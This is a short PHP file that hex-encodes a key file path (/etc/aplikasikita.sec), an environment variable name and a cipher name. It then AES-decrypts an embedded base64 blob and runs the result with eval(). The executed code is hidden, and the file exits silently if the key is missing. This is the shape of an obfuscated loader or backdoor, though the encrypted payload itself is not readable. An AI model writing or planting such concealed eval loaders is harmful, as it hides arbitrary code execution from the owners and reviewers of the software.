<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('aDqVUAt+K9BLIwcQWETDmQ==');

$c=base64_decode(

'QD8SA2ljR/1vimsPg+QEa8ts2xNi/HMYOCyYminMEsh4jEgrVRNrgKMy4Kaw+uEzlIvDWauus9h7' .
'Pmq0g1xuTeC3Z611y4SxKukymVSW2w8KkDsN5ZYcEPPNGo91Nqp6IggS8/RAmfMmwTs+U/bCAcnv' .
'ZgX99vbry2uQAhAHmzDMmRJURGg85piFYzXVtuuIR3kQaUvyeiBV+ZXHvOLhL1T26ZUWYPnhShD7' .
'MMhz3M4AZjlz7ZZDN2Wa2Gguoww152SKzbb1tqOnasqM8KsxLS1C3rhOwl+Z1/CbRu933TRNydOc' .
'BQCqKuEE1eRMhdGr3qE/UQet25zVREMUoPs2Wl6Cy31K4dHELduzY17tJo20ZCk1Q1BbQEaj1qrT' .
'/uSbdmDfDeizq5pVlDVlf24c+jSfMBpe69RSQtAbGg8fEluO7QYwMCgTJwjIf+FMJ8qTNY+S7Bb5' .
'jbGK/GQ3KG9RSHAkPcnUISqKn4Xu0KLQ1wl6Ksv8CAdAHAPZXVOQsyv3KujmxZNawNubuN+Bik4l' .
'6tQhFAimjgBuXmnr5kwKLe0='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

